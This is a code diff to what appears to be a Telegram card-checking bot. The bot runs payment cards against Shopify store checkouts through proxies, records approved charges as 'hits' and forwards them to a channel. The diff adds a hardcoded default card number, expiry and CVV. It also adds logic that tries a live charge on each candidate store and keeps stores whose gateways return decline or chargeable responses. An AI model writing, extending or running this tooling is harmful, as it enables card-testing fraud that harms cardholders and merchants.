@@ -60,6 +60,10 @@ PROGRESS_UPDATE_MIN_INTERVAL = float(os.getenv("PROGRESS_UPDATE_MIN_INTERVAL", "
 MAX_PENDING_TASKS_PER_USER = int(os.getenv("MAX_PENDING_TASKS_PER_USER", "50000"))
 MAX_TOTAL_PENDING_TASKS = int(os.getenv("MAX_TOTAL_PENDING_TASKS", "250000"))
 MCHK_LAST_RESPONSE_RETRIES = int(os.getenv("MCHK_LAST_RESPONSE_RETRIES", "2"))
+SITE_CHECK_TEST_CC = re.sub(r"\D", "", os.getenv("SITE_CHECK_TEST_CC", "4921909684885833"))
+SITE_CHECK_TEST_MM = os.getenv("SITE_CHECK_TEST_MM", "11")
+SITE_CHECK_TEST_YYYY = os.getenv("SITE_CHECK_TEST_YYYY", "2027")
+SITE_CHECK_TEST_CVV = re.sub(r"\D", "", os.getenv("SITE_CHECK_TEST_CVV", "942"))
 
 # Logging setup
 logging.basicConfig(
@@ -156,9 +160,9 @@ success_keys = [
 
 twofactor_keys = [
     "3d_secure_2",
-    "hooks",
-    "CERTIFICATE",
-    "ActionRequiredReceipt"
+    "ActionRequiredReceipt",
+    "OTP_REQUIRED",
+    "3DS_REQUIRED"
 ]
 
 ccn_keys = [
@@ -676,6 +680,60 @@ def run_gateway_keycheck(submit_resp, receipt_resp=None):
 
     fallback_message = error_msg or error_code or submit_type or receipt_type or 'NO_RESPONSE'
     return {'status': 'UNKNOWN', 'message': fallback_message}
+
+def is_decline_like_gateway_response(response_text):
+    """Detect gateway-decline style responses for site check acceptance."""
+    response_upper = normalize_response_text(response_text).upper()
+    if not response_upper:
+        return False
+    if "CAPTCHA_REQUIRED" in response_upper:
+        return False
+
+    infra_fail_markers = [
+        "SITE_DEAD",
+        "LOGIN_REQUIRED",
+        "REQUEST FAILED",
+        "FAILED TO GET SESSION TOKEN",
+        "NO VALID PRODUCTS",
+        "NOT SHOPIFY",
+        "SITE ERROR",
+        "PROXY ERROR",
+        "ERROR PROCESSING CARD",
+        "MAX RETRIES EXCEEDED",
+        "CHANGE PROXY OR SITE",
+        "THROTTLED",
+        "NEGOTIATION FAILED",
+        "NO DATA IN PROPOSAL RESPONSE",
+        "SESSION IS NULL",
+        "RESULT IS NULL"
+    ]
+    if any(marker in response_upper for marker in infra_fail_markers):
+        return False
+
+    decline_markers = [
+        "DECLINED",
+        "PAYMENTS_",
+        "CARD_",
+        "INVALID",
+        "EXPIRED",
+        "INSUFFICIENT",
+        "CVV",
+        "CVC",
+        "NSF",
+        "DO_NOT_HONOR",
+        "GENERIC_ERROR",
+        "RISKY"
+    ]
+    return any(marker in response_upper for marker in decline_markers)
+
+def should_add_site_from_gateway_result(success, response_text):
+    """Accept site when gateway is reachable and returns decline/chargeable output."""
+    response_upper = normalize_response_text(response_text).upper()
+    if "CAPTCHA_REQUIRED" in response_upper:
+        return False
+    if success:
+        return True
+    return is_decline_like_gateway_response(response_upper)
 
 async def forward_hit_message_to_channel(formatted_message, hit_status):
     """Forward approved results to HIT_CHANNEL with auto-disable on invalid peer."""
@@ -2279,12 +2337,12 @@ async def result_handler():
             # Format site name for compact user display.
             site_name = format_site_display_name(site)
             
-            # Always show receipt id when available (requested format).
+            # Show receipt only for charged/hit style outcomes.
             receipt_text = ""
-            if receipt_id:
+            if hit_status == "hit" and receipt_id:
                 safe_receipt_id = html.escape(str(receipt_id))
                 receipt_text = f"🧾 Receipt: <code>{safe_receipt_id}</code>"
-            elif order_url and order_url != 'N/A':
+            elif hit_status == "hit" and order_url and order_url != 'N/A':
                 safe_order_url = html.escape(str(order_url), quote=True)
                 receipt_text = f"🧾 <a href='{safe_order_url}'>View Order</a>"
             
@@ -3529,14 +3587,23 @@ async def chksite_command(client, message):
     skipped_sites = []
     dead_sites = []
     site_check_semaphore = asyncio.Semaphore(SITE_CHECK_WORKERS)
+    try:
+        site_check_card = parse_cc_string(
+            f"{SITE_CHECK_TEST_CC}|{SITE_CHECK_TEST_MM}|{SITE_CHECK_TEST_YYYY}|{SITE_CHECK_TEST_CVV}"
+        )
+    except ValueError as e:
+        await message.reply_text(f"❌ Site-check test card config is invalid: {e}", disable_web_page_preview=True)
+        asyncio.create_task(cleanup_task_data(msg_id, delay=10))
+        return
 
     async def _check_site(site_to_check):
         try:
             async with site_check_semaphore:
-                is_working, message_text, product_info = await test_site_connection(site_to_check, proxy)
+                product_info = await fetch_products(site_to_check, proxy)
+                if isinstance(product_info, tuple) and product_info[0] is False:
+                    return "dead", site_to_check, None, product_info[1]
 
-            if is_working:
-                # Hard guard for price range during site check.
+                # Hard guard for max price during site check.
                 try:
                     p = float(str((product_info or {}).get('price', '0')).replace(',', '').strip())
                 except Exception:
@@ -3547,12 +3614,24 @@ async def chksite_command(client, message):
                         f"Cheapest product ${p:.2f} is above ${MAX_SITE_PRODUCT_PRICE:.2f}"
                     )
 
+                # Gateway test using provided checker-style card.
+                gw_success, gw_response, _gw, _amt, _cur, _rid, _ourl = await process_card(
+                    site_check_card['cc'],
+                    site_check_card['mes'],
+                    site_check_card['ano'],
+                    site_check_card['cvv'],
+                    site_to_check,
+                    user.id,
+                    proxy
+                )
+
+            if should_add_site_from_gateway_result(gw_success, gw_response):
                 saved, save_msg = await save_working_site(user.id, site_to_check, product_info)
                 if saved:
                     return "hit", site_to_check, product_info, None
                 return "skipped", site_to_check, product_info, save_msg
 
-            return "dead", site_to_check, None, message_text
+            return "dead", site_to_check, None, f"Gateway check failed: {normalize_response_text(gw_response)}"
         except Exception as e:
             return "dead", site_to_check, None, str(e)
 
